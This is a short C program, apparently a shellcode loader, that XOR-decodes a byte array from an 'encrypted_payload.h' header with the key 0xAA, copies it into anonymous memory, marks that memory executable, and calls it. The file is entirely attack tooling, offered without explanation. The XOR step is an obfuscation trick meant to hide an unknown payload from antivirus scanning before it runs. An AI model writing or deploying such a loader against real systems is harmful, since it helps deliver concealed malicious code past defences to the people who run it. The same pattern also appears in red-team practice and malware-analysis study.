#include <stdio.h> 
#include <string.h> 
#include <sys/mman.h> 

#include "encrypted_payload.h"

int main(void)
{
	void *mem; 
	unsigned char *dest;
	void (*shellcode)(void); 
	unsigned int i;

	mem = mmap(
		NULL, 
		encrypted_payload_len, 
		PROT_READ | PROT_WRITE, 
		MAP_PRIVATE | MAP_ANONYMOUS, 
		-1, 
		0
	);

	dest = (unsigned char *)mem; 
	for (i = 0; i < encrypted_payload_len; i++) {
		dest[i] = encrypted_payload[i] ^ 0xAA;
	}

	mprotect(mem, encrypted_payload_len, PROT_READ | PROT_EXEC);

	shellcode = (void (*)(void))mem;
	shellcode(); 

	return 0; 
}